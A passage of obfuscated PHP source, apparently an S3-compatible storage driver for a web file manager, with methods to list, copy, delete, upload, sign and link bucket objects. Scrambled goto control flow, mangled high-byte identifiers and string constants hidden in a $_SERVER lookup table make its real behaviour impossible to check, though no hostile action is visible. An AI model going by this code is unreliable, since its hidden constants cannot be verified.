$A¹¨ÎÍöã[33] ? $b·Å»ôìÆ‰ : rtrim($cöŞÅØ¸à, $A¹¨ÎÍöã[8]) . $A¹¨ÎÍöã[8] . $b·Å»ôìÆ‰; if ($eÛ‘‰«š == REPEAT_REPLACE || !$this->exist($EÁ°´¾òîó) || $aÔñÁŠáÑÚ && $eÛ‘‰«š != REPEAT_RENAME_FOLDER) { return $b·Å»ôìÆ‰; } goto DÌ—‰™“¼Ä; d‰ŸÑ‚×±÷: $Dà†°’•ò = 1; $Eô¾ƒ¹Ç‡Ğ = substr($b·Å»ôìÆ‰, 0, strlen($b·Å»ôìÆ‰) - strlen($E†Š†…â•)); $CÄãËÓƒ¶® = $Eô¾ƒ¹Ç‡Ğ . "\x28{$Dà†°’•ò}\x29{$E†Š†…â•}"; goto aø—¢©‹¶â; BØÀ“ºäòÁ: } public function listAllFiles($E“ŠÎíçÊ®, $BØŸ¥…– Ù, $Dô¸­†ËÛ = array()) { goto E¢Î¶ÃÆ·ò; Bˆ–¶”øù¹: $E“ŠÎíçÊ® = trim($E“ŠÎíçÊ®, $b»ÑœÚ”²ï[8]); foreach ($BØŸ¥…– Ù as $FÉ¨‹–¾Æ) { $e§Ğ©æ›±ï = ltrim(substr($FÉ¨‹–¾Æ, strlen($E“ŠÎíçÊ®)), $b»ÑœÚ”²ï[8]); $eô“Æ¸…½ = array_merge($eô“Æ¸…½, $this->slicePath($e§Ğ©æ›±ï)); } $A‹Ñ¼ö‡¦± = array(); goto F¦Í—Î¥ä; E¢Î¶ÃÆ·ò: $b»ÑœÚ”²ï =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($BØŸ¥…– Ù)) { return array(); } $eô“Æ¸…½ = array(); goto Bˆ–¶”øù¹; F¦Í—Î¥ä: foreach (array_unique($eô“Æ¸…½) as $FÉ¨‹–¾Æ) { $dßİÄ§Äó„ = array($b»ÑœÚ”²ï[75] => $this->getPathOuter($b»ÑœÚ”²ï[8] . $E“ŠÎíçÊ® . $b»ÑœÚ”²ï[8] . $FÉ¨‹–¾Æ), $b»ÑœÚ”²ï[76] => 1, $b»ÑœÚ”²ï[77] => 0); if (substr($FÉ¨‹–¾Æ, -1) != $b»ÑœÚ”²ï[8]) { $dßİÄ§Äó„[$b»ÑœÚ”²ï[76]] = 0; $A¿‹†Ş˜õ‚ = $this->getPath($E“ŠÎíçÊ® . $b»ÑœÚ”²ï[8] . $FÉ¨‹–¾Æ); $dßİÄ§Äó„[$b»ÑœÚ”²ï[77]] = isset($Dô¸­†ËÛ[$A¿‹†Ş˜õ‚]) ? $Dô¸­†ËÛ[$A¿‹†Ş˜õ‚] : $this->size($A¿‹†Ş˜õ‚); } $A‹Ñ¼ö‡¦±[] = $dßİÄ§Äó„; } return $A‹Ñ¼ö‡¦±; goto b¿Óª»‚ ; b¿Óª»‚ : } public function slicePath($fíå¤ŠŒÀÔ) { $BÇùêÙĞÜ‚ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a¨Æ•†Û†¥ = explode($BÇùêÙĞÜ‚[8], trim($fíå¤ŠŒÀÔ, $BÇùêÙĞÜ‚[8])); $E¼½ÏÏ¶ñ’ = 0; do { ++$E¼½ÏÏ¶ñ’; $B‚Şà³İÈÚ[] = implode($BÇùêÙĞÜ‚[8], array_slice($a¨Æ•†Û†¥, 0, $E¼½ÏÏ¶ñ’)) . $BÇùêÙĞÜ‚[8]; } while ($E¼½ÏÏ¶ñ’ < count($a¨Æ•†Û†¥)); $B‚Şà³İÈÚ[count($a¨Æ•†Û†¥) - 1] = $fíå¤ŠŒÀÔ; return $B‚Şà³İÈÚ; } public function getHost() { $d´—¼’ Ø =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $AÚ´šää×ƒ = parse_url(trim($this->domain, $d´—¼’ Ø[8])); $fğİº«ìÃ” = isset($AÚ´šää×ƒ[$d´—¼’ Ø[168]]) ? $AÚ´šää×ƒ[$d´—¼’ Ø[168]] : http_type(); $bÉ…‰¾­¾Ü = isset($AÚ´šää×ƒ[$d´—¼’ Ø[169]]) ? $AÚ´šää×ƒ[$d´—¼’ Ø[169]] : $AÚ´šää×ƒ[$d´—¼’ Ø[75]]; if (isset($AÚ´šää×ƒ[$d´—¼’ Ø[170]])) { $bÉ…‰¾­¾Ü .= $d´—¼’ Ø[4] . $AÚ´šää×ƒ[$d´—¼’ Ø[170]]; } return $fğİº«ìÃ” . $d´—¼’ Ø[171] . $bÉ…‰¾­¾Ü; } public function pathEncode($cé—÷¯ Ü) { $Dãåğ«Œ› =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return str_replace($Dãåğ«Œ›[172], $Dãåğ«Œ›[8], rawurlencode($cé—÷¯ Ü)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($b¼Ò¤‹©£Ò) { set_timeout(); require_once SDK_DIR . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][173]; parent::__construct(); $this->_init($b¼Ò¤‹©£Ò); } public function _init($b¸ÜÕñ¾­Å) { foreach ($b¸ÜÕñ¾­Å as $aõ½œ‡ËÕ× => $C¯øè‚¾Ì) { if (isset($this->{$aõ½œ‡ËÕ×})) { $this->{$aõ½œ‡ËÕ×} = $C¯øè‚¾Ì; } } $this->endpoint = $b¸ÜÕñ¾­Å[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($C›É¥¡‡½ = "\x76\64") { $this->signVer = $C›É¥¡‡½; $this->client->setSignatureVersion($C›É¥¡‡½); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto EÖèƒìê¹‡; a÷†ÈËÍ±Ë: if ($f‡„Ê°›â…[$Aïš÷²£­[175]] != $Aïš÷²£­[176] || $f‡„Ê°›â…[$Aïš÷²£­[177]] != $Aïš÷²£­[176]) { return !1; } $eŠ÷÷Ûß¿Ú = array_map($Aïš÷²£­[178], $f‡„Ê°›â…[$Aïš÷²£­[179]]); if (!is_array($eŠ÷÷Ûß¿Ú)) { $eŠ÷÷Ûß¿Ú = array(); } goto bãåŸİìÈÈ; EÖèƒìê¹‡: $Aïš÷²£­ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f‡„Ê°›â… = $this->getBucketCors(); if (!$f‡„Ê°›â… || !is_array($f‡„Ê°›â…)) { return !1; } goto a÷†ÈËÍ±Ë; bãåŸİìÈÈ: $e—ã˜­ÅŠ = array($Aïš÷²£­[180], $Aïš÷²£­[181], $Aïš÷²£­[182], $Aïš÷²£­[183], $Aïš÷²£­[184]); $F÷¶‘ï‡ìé = array_diff($e—ã˜­ÅŠ, $eŠ÷÷Ûß¿Ú); return empty($F÷¶‘ï‡ìé); goto Cì¡£ë•™ç; Cì¡£ë•™ç: } public function mkfile($D¬ˆŒ³Ì®, $B¶õÀ¼İ¨… = '', $bò²ºÀ÷™ = REPEAT_RENAME) { $eë¨ºÎô»ñ = $this->setContent($D¬ˆŒ³Ì®, $B¶õÀ¼İ¨…); if ($eë¨ºÎô»ñ !== !1) { return $this->getPathOuter($D¬ˆŒ³Ì®); } return !1; } public function mkdir($bÏ½›¿õ˜, $A†ÅæÜ²‡© = REPEAT_SKIP) { if (empty($bÏ½›¿õ˜)) { return !1; } if ($this->_isFolder($bÏ½›¿õ˜)) { return $this->getPathOuter($bÏ½›¿õ˜); } $EÜ¼£¬ùËÂ = $this->setContent($bÏ½›¿õ˜, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][33], !0); if ($EÜ¼£¬ùËÂ !== !1) { return $this->getPathOuter($bÏ½›¿õ˜); } return !1; } public function copyFile($BÁ†»÷é š, $FÏ·±˜±ñ½, $AŞô¹·‹ì³ = array()) { $bíÄŒÚöÄ± =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f…‚µÜ÷õ = $this->objectMeta($BÁ†»÷é š); if (!$f…‚µÜ÷õ) { return !1; } if ($f…‚µÜ÷õ[$bíÄŒÚöÄ±[77]] <= 1024 * 1024 * 200) { $F›ªÖ¹²†â = $this->client->copyObject($this->bucket, $BÁ†»÷é š, $this->bucket, $FÏ·±˜±ñ½, $bíÄŒÚöÄ±[185], $AŞô¹·‹ì³); } else { $F›ªÖ¹²†â = $this->client->multiCopyObject($this->bucket, $BÁ†»÷é š, $this->bucket, $FÏ·±˜±ñ½, $AŞô¹·‹ì³); } $F›ªÖ¹²†â = $F›ªÖ¹²†â ? $this->getPathOuter($FÏ·±˜±ñ½) : !1; return $F›ªÖ¹²†â; } public function moveFile($cÎ‹ö¯¿Å, $b¡ŞÚªÑ’¢) { if ($this->copyFile($cÎ‹ö¯¿Å, $b¡ŞÚªÑ’¢)) { $this->delFile($cÎ‹ö¯¿Å); return $this->getPathOuter($b¡ŞÚªÑ’¢); } return !1; } public function delFile($E×ˆÛ‘äÈ±) { return $this->client->deleteObject($this->bucket, $E×ˆÛ‘äÈ±); } public function delFolder($eê¬Àİ²ì) { goto eéˆİ‰³ïç; C¢ïŒ–ĞÎæ: return $bë‘¥ˆ‹ù… === $AÖ´¹¶ˆÚ¬ ? !0 : !1; goto b¦–œ‚¦Ò±; eéˆİ‰³ïç: $F“Ó°ÉôŒ† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D‘½íÎé“Œ = $this->listObjs($eê¬Àİ²ì); if (!$D‘½íÎé“Œ) { $eê¬Àİ²ì = trim($eê¬Àİ²ì, $F“Ó°ÉôŒ†[8]); if (!empty($eê¬Àİ²ì)) { $eê¬Àİ²ì .= $F“Ó°ÉôŒ†[8]; } return $this->delFile($eê¬Àİ²ì); } goto dëÂ¢¡³¼ë; dëÂ¢¡³¼ë: $bë‘¥ˆ‹ù… = $AÖ´¹¶ˆÚ¬ = 0; $A†Óùº’ÎŠ = array_chunk(array_keys($D‘½íÎé“Œ), 1000); foreach ($A†Óùº’ÎŠ as $a¯Ÿ†„àäò) { $bë‘¥ˆ‹ù…++; $AÖ´¹¶ˆÚ¬ += (int) $this->client->deleteObjects($this->bucket, $a¯Ÿ†„àäò); } goto C¢ïŒ–ĞÎæ; b¦–œ‚¦Ò±: } public function rename($F£“†îê˜Õ, $eÒ¯Íù¶ì) { return $this->renameObject($F£“†îê˜Õ, $eÒ¯Íù¶ì); } public function listPath($f°·…ÃÊ‡˜, $d„àëİ½Õ­ = false) { $CàÄˆº¿ï =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B¦‘İŸ„ = $this->listObjs($f°·…ÃÊ‡˜, null, null, $CàÄˆº¿ï[8]); $b£¸²éí²‘ = array($CàÄˆº¿ï[74] => array(), $CàÄˆº¿ï[73] => array()); foreach ($B¦‘İŸ„ as $c¿Ò°ÕŸŞï => $Fƒù½ó©) { if ($c¿Ò°ÕŸŞï == $CàÄˆº¿ï[8]) { continue; } if (isset($Fƒù½ó©[$CàÄˆº¿ï[186]])) { $b£¸²éí²‘[$CàÄˆº¿ï[74]][] = $this->folderInfo($Fƒù½ó©[$CàÄˆº¿ï[186]], $d„àëİ½Õ­); } else { if (substr($Fƒù½ó©[$CàÄˆº¿ï[28]], -1) == $CàÄˆº¿ï[8]) { continue; } $b£¸²éí²‘[$CàÄˆº¿ï[73]][] = $this->fileInfo($Fƒù½ó©[$CàÄˆº¿ï[28]], $d„àëİ½Õ­, $Fƒù½ó©); } } return $b£¸²éí²‘; } private function fileInfo($eƒ‚­©ëñğ, $CÓœ…ôæÅ = false, $F¨¡ƒÌ²®¹ = array()) { goto Aò†ºƒôÑ; AƒÅŸÇ¼Üõ: if (empty($F¨¡ƒÌ²®¹)) { $F¨¡ƒÌ²®¹ = $this->objectMeta($eƒ‚­©ëñğ); if (!$F¨¡ƒÌ²®¹) { return $BÁêÛ©¿Åê; } } if (isset($F¨¡ƒÌ²®¹[$b±éŒ¹›ĞÅ[190]])) { $BÁêÛ©¿Åê[$b±éŒ¹›ĞÅ[107]] = $F¨¡ƒÌ²®¹[$b±éŒ¹›ĞÅ[190]]; } if (isset($F¨¡ƒÌ²®¹[$b±éŒ¹›ĞÅ[77]])) { $BÁêÛ©¿Åê[$b±éŒ¹›ĞÅ[77]] = $F¨¡ƒÌ²®¹[$b±éŒ¹›ĞÅ[77]]; } goto b÷áìšĞ¢µ; b÷áìšĞ¢µ: return $BÁêÛ©¿Åê; goto D“—¢¯ö½Û; Aò†ºƒôÑ: $b±éŒ¹›ĞÅ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($CÓœ…ôæÅ) { return array($b±éŒ¹›ĞÅ[28] => $this->pathThis($eƒ‚­©ëñğ), $b±éŒ¹›ĞÅ[75] => $this->getPathOuter($eƒ‚­©ëñğ), $b±éŒ¹›ĞÅ[29] => $b±éŒ¹›ĞÅ[167], $b±éŒ¹›ĞÅ[160] => $this->ext($eƒ‚­©ëñğ), $b±éŒ¹›ĞÅ[77] => isset($F¨¡ƒÌ²®¹[$b±éŒ¹›ĞÅ[77]]) ? $F¨¡ƒÌ²®¹[$b±éŒ¹›ĞÅ[77]] : 0, $b±éŒ¹›ĞÅ[187] => 0, $b±éŒ¹›ĞÅ[107] => 0, $b±éŒ¹›ĞÅ[188] => !0, $b±éŒ¹›ĞÅ[189] => !0); } $BÁêÛ©¿Åê = array($b±éŒ¹›ĞÅ[28] => $this->pathThis($eƒ‚­©ëñğ), $b±éŒ¹›ĞÅ[75] => $this->getPathOuter($eƒ‚­©ëñğ), $b±éŒ¹›ĞÅ[29] => $b±éŒ¹›ĞÅ[167], $b±éŒ¹›ĞÅ[187] => 0, $b±éŒ¹›ĞÅ[107] => 0, $b±éŒ¹›ĞÅ[77] => 0, $b±éŒ¹›ĞÅ[160] => $this->ext($eƒ‚­©ëñğ), $b±éŒ¹›ĞÅ[188] => !0, $b±éŒ¹›ĞÅ[189] => !0); goto AƒÅŸÇ¼Üõ; D“—¢¯ö½Û: } private function folderInfo($d´í…©à÷è, $A¶ïœ“Áˆ† = false) { goto bóß”ŒÂÎ; d»’ùÒ”Ê¢: if (isset($BåÇí‹÷©[$e¾øÒÀ¹Ê[190]])) { $e‘¢‰†–˜Â[$e¾øÒÀ¹Ê[187]] = $BåÇí‹÷©[$e¾øÒÀ¹Ê[190]]; } return $e‘¢‰†–˜Â; goto c¬ö´‘§Œ¶; bóß”ŒÂÎ: $e¾øÒÀ¹Ê =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($A¶ïœ“Áˆ†) { return array($e¾øÒÀ¹Ê[28] => $this->pathThis($d´í…©à÷è), $e¾øÒÀ¹Ê[75] => $this->getPathOuter($e¾øÒÀ¹Ê[8] . $d´í…©à÷è), $e¾øÒÀ¹Ê[29] => $e¾øÒÀ¹Ê[76], $e¾øÒÀ¹Ê[188] => !0, $e¾øÒÀ¹Ê[189] => !0); } $e‘¢‰†–˜Â = array($e¾øÒÀ¹Ê[28] => $this->pathThis($d´í…©à÷è), $e¾øÒÀ¹Ê[75] => $this->getPathOuter($e¾øÒÀ¹Ê[8] . $d´í…©à÷è), $e¾øÒÀ¹Ê[29] => $e¾øÒÀ¹Ê[76], $e¾øÒÀ¹Ê[187] => 0, $e¾øÒÀ¹Ê[107] => 0, $e¾øÒÀ¹Ê[188] => !0, $e¾øÒÀ¹Ê[189] => !0); goto aÚå±æö; aÚå±æö: if ($d´í…©à÷è == $e¾øÒÀ¹Ê[33]) { return $e‘¢‰†–˜Â; } $d´í…©à÷è = trim($d´í…©à÷è, $e¾øÒÀ¹Ê[8]) . $e¾øÒÀ¹Ê[8]; $BåÇí‹÷© = $this->objectMeta($d´í…©à÷è); goto d»’ùÒ”Ê¢; c¬ö´‘§Œ¶: } public function listObjs($c”›º·õÆÕ, $Fº•íõè×ß = null, $BòÆŠÆÙ§™ = null, $f–ÃÄ£İ = null) { $cï„ï¾ìÍ‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c”›º·õÆÕ = trim($c”›º·õÆÕ, $cï„ï¾ìÍ‘[8]); $b¡×æºÆµ = empty($c”›º·õÆÕ) ? $cï„ï¾ìÍ‘[33] : $c”›º·õÆÕ . $cï„ï¾ìÍ‘[8]; return $this->client->getBucket($this->bucket, $b¡×æºÆµ, $Fº•íõè×ß, $BòÆŠÆÙ§™, $f–ÃÄ£İ, !0); } public function has($bô”À†³–¿, $d¶Ş±½÷­¦ = false, $e½§æ®Öæ¨ = true) { goto b‡³†ƒÁá ; b‡³†ƒÁá : $D™ß—¨ã­· =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F¥®­›»ìÄ = 0; $c×œŠ‹áà = 0; goto bÅ‡ŸÜ×Œ›; Cäó‘ì¶¹: if ($d¶Ş±½÷­¦) { return array($D™ß—¨ã­·[191] => $F¥®­›»ìÄ, $D™ß—¨ã­·[192] => $c×œŠ‹áà); } return !1; goto a½ÇâÊóÏ; bÅ‡ŸÜ×Œ›: $fóŒé…£º = $this->listObjs($bô”À†³–¿, null, null, $D™ß—¨ã­·[8]); $fóŒé…£º = is_array($fóŒé…£º) ? $fóŒé…£º : array(); foreach ($fóŒé…£º as $fëÈÚİŞÃé) { if (isset($fëÈÚİŞÃé[$D™ß—¨ã­·[28]]) && substr($fëÈÚİŞÃé[$D™ß—¨ã­·[28]], -1) != $D™ß—¨ã­·[8]) { if (!$d¶Ş±½÷­¦ && $e½§æ®Öæ¨) { return !0; } $F¥®­›»ìÄ++; } else { if (isset($fëÈÚİŞÃé[$D™ß—¨ã­·[186]])) { if (!$d¶Ş±½÷­¦ && !$e½§æ®Öæ¨) { return !1; } $c×œŠ‹áà++; } } } goto Cäó‘ì¶¹; a½ÇâÊóÏ: } public function listAll($dèèÅˆÑí²) { $då‘ò‚ÙÆ™ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Aš¨ÚÔîöÜ = $this->listObjs($dèèÅˆÑí²); $A„×‘‹¼éÈ = $F”¹¹¡Ù†‰ = array(); foreach ($Aš¨ÚÔîöÜ as $C¢•…¿ÙÂ± => $FøÕ¡´Äâ) { $A„×‘‹¼éÈ[] = $FøÕ¡´Äâ[$då‘ò‚ÙÆ™[28]]; $F”¹¹¡Ù†‰[$C¢•…¿ÙÂ±] = $FøÕ¡´Äâ[$då‘ò‚ÙÆ™[77]]; } return $this->listAllFiles($dèèÅˆÑí², $A„×‘‹¼éÈ, $F”¹¹¡Ù†‰); } public function canRead($BÆÆ‹Åë¦¹) { $B¼Ö”šèÅ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EÁ±ŒµÖŒœ = $this->client->getAccessControlPolicy($this->bucket, $BÆÆ‹Åë¦¹); if (!$EÁ±ŒµÖŒœ) { return !1; } return in_array($EÁ±ŒµÖŒœ, array($B¼Ö”šèÅ[193], $B¼Ö”šèÅ[194], $B¼Ö”šèÅ[195])) ? !0 : !1; } public function canWrite($fÆØ£“ƒÅ¸) { $fÁÅš…Òï… =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EßÊøÜ¸ãÄ = $this->client->getAccessControlPolicy($this->bucket, $fÆØ£“ƒÅ¸); if (!$EßÊøÜ¸ãÄ) { return !1; } return in_array($EßÊøÜ¸ãÄ, array($fÁÅš…Òï…[193], $fÁÅš…Òï…[194])) ? !0 : !1; } public function getContent($A¶‚ï¾õ°») { return $this->client->getObject($this->bucket, $A¶‚ï¾õ°»); } public function setContent($cŠëÊÄÜ, $E¡Šé®»ïÑ = '', $f–ÔäèŒ»‘ = false) { goto F‚Ê‰¾à¸§; F‚Ê‰¾à¸§: $EªæªëÜ‡ğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cŠëÊÄÜ = $f–ÔäèŒ»‘ ? trim($cŠëÊÄÜ, $EªæªëÜ‡ğ[8]) . $EªæªëÜ‡ğ[8] : $cŠëÊÄÜ; $dŠî¼†„È = get_file_mime(get_path_ext($cŠëÊÄÜ)); goto e¸é¢øùˆª; aÇ¦ÉİĞ•Ã: $this->cacheMethod(null, null); $c’ñ£Øˆ£¶ = $this->copyFile($cŠëÊÄÜ, $cŠëÊÄÜ, array($EªæªëÜ‡ğ[196] => $c’ñ£Øˆ£¶[$EªæªëÜ‡ğ[197]])); return $c’ñ£Øˆ£¶ ? !0 : !1; goto Eªºß´ç¦ğ; e¸é¢øùˆª: $c’ñ£Øˆ£¶ = $this->client->putObject($E¡Šé®»ïÑ, $this->bucket, $cŠëÊÄÜ, $EªæªëÜ‡ğ[185], array(), $dŠî¼†„È); if (!$c’ñ£Øˆ£¶) { return !1; } if ($f–ÔäèŒ»‘) { return !0; } goto aÇ¦ÉİĞ•Ã; Eªºß´ç¦ğ: } public function fileSubstr($B¾Ã² ¹æ˜, $aÅÈ–²Œ©ö, $E®ãİÍ§×“) { $CâµõÕÄ§¿ = $aÅÈ–²Œ©ö + $E®ãİÍ§×“ - 1; return $this->client->getObject($this->bucket, $B¾Ã² ¹æ˜, array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][198] => "\142\x79\x74\145\x73\75{$aÅÈ–²Œ©ö}\55{$CâµõÕÄ§¿}")); } public function upload($f±ëßáäŒ, $E»ç’êâ­®, $b§ê¡Ô½„÷ = false, $B®ÚØÊ­ë = REPEAT_REPLACE) { $DƒÊ¬Ñë† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aºÍ†§ÀæÀ = array($DƒÊ¬Ñë†[196] => @md5_file($E»ç’êâ­®)); $d‹­ ìÓ½ = array($DƒÊ¬Ñë†[199] => get_file_mime(get_path_ext($f±ëßáäŒ))); if (IO::size($E»ç’êâ­®) <= 1024 * 1024 * 200) { $AÔˆ³áœê³ = $this->client->putObjectFile($E»ç’êâ­®, $this->bucket, $f±ëßáäŒ, $DƒÊ¬Ñë†[185], $aºÍ†§ÀæÀ, $d‹­ ìÓ½); return !empty($AÔˆ³áœê³) ? $this->getPathOuter($f±ëßáäŒ) : !1; } $FÅ¯äªÓë = $this->client->multiUploadObject($E»ç’êâ­®, $this->bucket, trim($f±ëßáäŒ, $DƒÊ¬Ñë†[8]), $aºÍ†§ÀæÀ, $d‹­ ìÓ½); return $FÅ¯äªÓë ? $this->getPathOuter($f±ëßáäŒ) : !1; } public function download($bî•ÚÚºì, $a–¥¿²òÎ°) { if (!@is_dir($this->pathFather($a–¥¿²òÎ°)) && !IO::mkdir($this->pathFather($a–¥¿²òÎ°))) { return !1; } $A¿È‘†ô¶ç = $this->client->getObject($this->bucket, $bî•ÚÚºì, array(), $a–¥¿²òÎ°); return $A¿È‘†ô¶ç !== !1 ? $a–¥¿²òÎ° : !1; } public function link($EÔŒ®İóÙœ, $dØå–É´ç = array()) { $aó­†Äö¥ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($this->signVer == $aó­†Äö¥[200]) { return $this->client->getAuthenticatedURL($this->bucket, $EÔŒ®İóÙœ, 3600 * 12, $dØå–É´ç); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($EÔŒ®İóÙœ, $aó­†Äö¥[8]), 3600 * 12, $this->region, array(), !0, $dØå–É´ç); } public function fileOut($AÄÕø “Ç†, $eçÒ¤ªåá¸ = false, $B±‘¶¼×’ = false, $b¹ğ¡ºÈº§ = '') { goto c—¨…ìƒ; c—¨…ìƒ: $d´ŸøòÔ«Ñ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($this->isFileOutServer()) { return $this->fileOutServer($AÄÕø “Ç†, $eçÒ¤ªåá¸, $B±‘¶¼×’, $b¹ğ¡ºÈº§); } if (!$B±‘¶¼×’) { $B±‘¶¼×’ = $this->pathThis($AÄÕø “Ç†); } goto Cì”ŠƒİÉ„; Aê‘¬ÈÈ¨: $B¸Ü ¤  = array($d´ŸøòÔ«Ñ[204] => $eçÒ¤ªåá¸ . $d´ŸøòÔ«Ñ[205] . rawurlencode($B±‘¶¼×’), $d´ŸøòÔ«Ñ[206] => $DİŞÑÒäïà); $A—³Èç—«Ş = $this->link($AÄÕø “Ç†, $B¸Ü ¤ ); $this->fileOutLink($A—³Èç—«Ş); goto F¸Ò½ßõÌ÷; Cì”ŠƒİÉ„: $DİŞÑÒäïà = get_file_mime(get_path_ext($B±‘¶¼×’)); if ($DİŞÑÒäïà == $d´ŸøòÔ«Ñ[201]) { return parent::fileOut($AÄÕø “Ç†, $eçÒ¤ªåá¸, $B±‘¶¼×’, $b¹ğ¡ºÈº§); } $eçÒ¤ªåá¸ = $eçÒ¤ªåá¸ ? $d´ŸøòÔ«Ñ[202] : $d´ŸøòÔ«Ñ[203]; goto Aê‘¬ÈÈ¨; F¸Ò½ßõÌ÷: } public function fileOutServer($a–¶¸‡æº, $a…óµÒ®œÃ = false, $a‘À…’«ù« = false, $F¡òğÕ‰ = '') { parent::fileOut($a–¶¸‡æº, $a…óµÒ®œÃ, $a‘À…’«ù«, $F¡òğÕ‰); } public function fileOutImageServer($DĞ’½µÂ…â, $A×ÒŞ¯¤Õ” = 250) { parent::fileOutImage($DĞ’½µÂ…â, $A×ÒŞ¯¤Õ”); } public function hashMd5($eÍ‰õ½¡ì, $eäÃÑ¾µÇ = '') { $DÖŠ–ø‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E·Ÿß£ê‡¥ = $this->objectMeta($eÍ‰õ½¡ì); if (!$E·Ÿß£ê‡¥) { return !1; } $eäÃÑ¾µÇ = $eäÃÑ¾µÇ ? $eäÃÑ¾µÇ : _get($E·Ÿß£ê‡¥, $DÖŠ–ø‘[207]); $eäÃÑ¾µÇ = $eäÃÑ¾µÇ ? $eäÃÑ¾µÇ : _get($E·Ÿß£ê‡¥, $DÖŠ–ø‘[197], $DÖŠ–ø‘[33]); return $eäÃÑ¾µÇ; } public function uploadFormData($Dò¤Ì‘À‚¢, $côÓáˆ¢ = 3600) { $F Ì‚ê­ô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e§±Œ£‡ = $this->pathFather($Dò¤Ì‘À‚¢); $f—‰¬Ëó = $this->client->getHttpUploadPostParams($this->bucket, $e§±Œ£‡, $F Ì‚ê­ô[185], $côÓáˆ¢); return array_merge((array) $f—‰¬Ëó, array($F Ì‚ê­ô[169] => $this->getHost())); } public function multiUploadFormData($C –†¿ƒÃ , $aÌÕ¯“Ó¸· = 3600) { $cÕ±‹›—Æ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $FÏÒ´âáİÀ = gmdate($cÕ±‹›—Æ[208]); $CËÓà«ŠÔˆ = array(); $Bµ½‡é”š = $this->client->getUploadId($this->bucket, $C –†¿ƒÃ , $CËÓà«ŠÔˆ); if (!$Bµ½‡é”š) { return !1; } return array($cÕ±‹›—Æ[209] => $Bµ½‡é”š, $cÕ±‹›—Æ[169] => $this->getHost() . $cÕ±‹›—Æ[8] . $this->pathEncode($C –†¿ƒÃ ), $cÕ±‹›—Æ[210] => $FÏÒ´âáİÀ, $cÕ±‹›—Æ[89] => $C –†¿ƒÃ ); } public function multiUploadAuthData($FŠ±ó“Ú¹, $Câª¤©® = array()) { goto B†ÊÑÓ÷â; aÜ…¡ä¶ÑÉ: $e®ØŸ„Ø = implode($eäŒÁÊˆÙé[217], $bóÎ”Œ—å¦); $Cƒíİí¶ = base64_encode(hash_hmac($eäŒÁÊˆÙé[218], $e®ØŸ„Ø, $this->secret, !0)); $a…àÔÔË™ä = $eäŒÁÊˆÙé[219] . $this->accessKey . $eäŒÁÊˆÙé[4] . $Cƒíİí¶; goto B……ïè§çË; B†ÊÑÓ÷â: $eäŒÁÊˆÙé =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B÷Î©¨Úç = isset($Câª¤©®[$eäŒÁÊˆÙé[210]]) ? $Câª¤©®[$eäŒÁÊˆÙé[210]] : gmdate($eäŒÁÊˆÙé[208]); $bÚ¥³½ªÛ = isset($Câª¤©®[$eäŒÁÊˆÙé[160]]) ? $Câª¤©®[$eäŒÁÊˆÙé[160]] : $eäŒÁÊˆÙé[33]; goto eŸÎâÒ†‘Ï; eŸÎâÒ†‘Ï: $bì–´ôÄªö = $Câª¤©®[$eäŒÁÊˆÙé[89]]; unset($Câª¤©®[$eäŒÁÊˆÙé[89]]); if (isset($Câª¤©®[$eäŒÁÊˆÙé[211]])) { $Câª¤©®[$eäŒÁÊˆÙé[210]] = $B÷Î©¨Úç; return $this->listUploadParts($bì–´ôÄªö, $Câª¤©®); } goto BÇŒŒ³ñãÅ; BÇŒŒ³ñãÅ: $bóÎ”Œ—å¦ = array($eäŒÁÊˆÙé[212], $eäŒÁÊˆÙé[33], $eäŒÁÊˆÙé[116], $eäŒÁÊˆÙé[33], "\170\x2d\141\155\x7a\55\x64\x61\164\x65\72{$B÷Î©¨Úç}", $eäŒÁÊˆÙé[8] . $this->bucket . $eäŒÁÊˆÙé[8] . $this->pathEncode($bì–´ôÄªö) . $bÚ¥³½ªÛ); if (strpos($bÚ¥³½ªÛ, $eäŒÁÊˆÙé[213]) === 0) { $bóÎ”Œ—å¦[0] = $eäŒÁÊˆÙé[214]; } if (isset($Câª¤©®[$eäŒÁÊˆÙé[215]]) && $Câª¤©®[$eäŒÁÊˆÙé[215]] == $eäŒÁÊˆÙé[216]) { $bóÎ”Œ—å¦[0] = $eäŒÁÊˆÙé[216]; } goto aÜ…¡ä¶ÑÉ; B……ïè§çË: if 